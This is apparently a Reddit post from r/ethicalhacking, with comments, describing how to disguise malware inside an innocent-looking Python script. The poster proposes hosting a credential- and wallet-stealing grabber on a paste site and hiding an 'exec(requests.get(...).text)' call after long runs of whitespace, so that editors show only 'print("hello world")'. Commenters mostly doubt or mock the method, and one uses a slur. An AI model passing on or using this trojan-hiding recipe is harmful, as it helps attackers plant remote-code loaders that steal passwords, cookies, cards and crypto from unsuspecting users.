@@ -1,0 +1,77 @@
+POST ID: 124h8vb / POST TITLE: Method to make a python file look legit
+====================================================================================================
+Greetings hackers!  
+
+
+I have recently found a method to make a python file look like a legitimate file. To a normal person, this would just look like a legitimate python file, when in reality it's a backdoor/trojan/worm/rat/bomb/stealer/keylogger/rootkit or whatever. First of all, the attacker would need to create a virus file. For this test, I will be using a stealer known as "Luna Grabber". This will steal browser passwords, cookies, history, it will also steal various info such as Minecraft cache, crypto wallets, credit cards and anything like that. Now I will upload this code to a text sharing website. This can be Pastebin, Hastebin, Sharetext or any text sharing website of your choice. Now you are gonna wanna copy the raw link of the website. Put this as a note.  
+
+
+Now once you have done that, the main part, you are gonna wanna find or make any legitimate python file. For this test, I will just have a simple python hello world script, print("Hello World!"). The main question of this is how will we be able to convert this simple hello world script into a stealer that will steal crypto wallets, passwords etc.? Well you can do this with semicolons (;). In python, this allows you to put stuff on a new line. However it's very uncommon for people to do this.  For example, you can use a semicolon to write two print statements on the same line like this:  print("Hello, "); print("world!"). Also, you could do this to seperate statements  i = 2; if i > 1: print("The i variable is greater than one."). However, it's important to note that using semicolons to separate statements in Python is not considered a best practice and is generally discouraged. 
+
+&#x200B;
+
+But how can this be exploited by Ethical and malicious hackers? Well you can put lots of spaces after, and before a semicolon. For example, if you wanted to print hello world but then print "LOL this didn't just print hello world", you could do this:  
+print("hello world")                                  (lots of spaces)                                                      ;print("LOL this didn't just print hello world").
+
+Or you could do this
+
+print("hello world")                       (lots of spaces)    ;                   (lots of spaces)   print("blablabla")                   (lots of spaces)#   (lots of spaces)
+
+Now if anyone looks at the code, it will just look like print("hello world"),  also if they scroll really far back, it will also do the same because we added lots of spaces after the hashtag character. But if they scroll really slowly back, they will see the "malicious code" which isn't really maliciious it just prints stuff.
+
+However and attacker could exploit this and make it like this:  
+print("hello world")                       (lots of spaces)    ;                   (lots of spaces)   exec(requests.get(malicious payload url).text)                   (lots of spaces)#   (lots of spaces)
+
+and to the normal user, it would appear to be just print("hello world"). But in reality, it will run your malicious payload in the background. It will do the same in all code editors. Visual studio code, IDLE, Sublime text, notepad lmao or anything.
+
+POST COMMENTS:
+====================================================================================================
+ID: jdzgrum # OF UPVOTES: 4.0 SUBREDDIT: ethicalhacking
+COMMENT TEXT: Why would anyone copy and paste or download your "Hello World" script?
+----------------------------------------------------------------------------------------------------
+ID: je2bsqw # OF UPVOTES: 1.0 SUBREDDIT: ethicalhacking
+COMMENT TEXT: Have you tried this?
+----------------------------------------------------------------------------------------------------
+ID: jdzzmzp # OF UPVOTES: 1.0 SUBREDDIT: ethicalhacking
+COMMENT TEXT: This is nonsense. Sublime would defeat your attack.
+----------------------------------------------------------------------------------------------------
+ID: ji3twno # OF UPVOTES: 1.0 SUBREDDIT: ethicalhacking
+COMMENT TEXT: hmm yes this seems very ethical
+----------------------------------------------------------------------------------------------------
+ID: jdzrvzc # OF UPVOTES: 2.0 SUBREDDIT: ethicalhacking
+COMMENT TEXT: it can be used for other files too, it doesn't just have to be a print("Hello World!") script, you can put the malicious whitespace in other programs too obviously.
+----------------------------------------------------------------------------------------------------
+ID: jdzrt4r # OF UPVOTES: 1.0 SUBREDDIT: ethicalhacking
+COMMENT TEXT: thats just a demo
+----------------------------------------------------------------------------------------------------
+ID: jdzrzff # OF UPVOTES: 1.0 SUBREDDIT: ethicalhacking
+COMMENT TEXT: they would download it if it was a good tool, and they thought it was safe
+----------------------------------------------------------------------------------------------------
+ID: je45mxw # OF UPVOTES: 1.0 SUBREDDIT: ethicalhacking
+COMMENT TEXT: yes
+----------------------------------------------------------------------------------------------------
+ID: jn5n1z7 # OF UPVOTES: 1.0 SUBREDDIT: ethicalhacking
+COMMENT TEXT: no, i use sublime and it seems to work fine, I tested it on vs code, sublime text, IDLE, even notepad and it still worked on every single one of them
+----------------------------------------------------------------------------------------------------
+ID: je3zx8v # OF UPVOTES: 1.0 SUBREDDIT: ethicalhacking
+COMMENT TEXT: Or any text editor really.
+
+
+Hmmm why does the horizontal scroll bard go so far to the left??
+----------------------------------------------------------------------------------------------------
+ID: ji5urwh # OF UPVOTES: 0.0 SUBREDDIT: ethicalhacking
+COMMENT TEXT: it is ethical lmfao its for pentesting retard
+----------------------------------------------------------------------------------------------------
+ID: ji5usfs # OF UPVOTES: 0.0 SUBREDDIT: ethicalhacking
+COMMENT TEXT: you probably don't even know what pentesting is
+----------------------------------------------------------------------------------------------------
+ID: jedr5k2 # OF UPVOTES: 1.0 SUBREDDIT: ethicalhacking
+COMMENT TEXT: If you done the steps right, it should bypass the scroll bar thing.
+----------------------------------------------------------------------------------------------------
+ID: ji725k7 # OF UPVOTES: 1.0 SUBREDDIT: ethicalhacking
+COMMENT TEXT: [https://files.catbox.moe/y3irvx.PNG](https://files.catbox.moe/y3irvx.PNG)  
+🤓
+----------------------------------------------------------------------------------------------------
+ID: jedr8r5 # OF UPVOTES: 1.0 SUBREDDIT: ethicalhacking
+COMMENT TEXT: How though?
+----------------------------------------------------------------------------------------------------
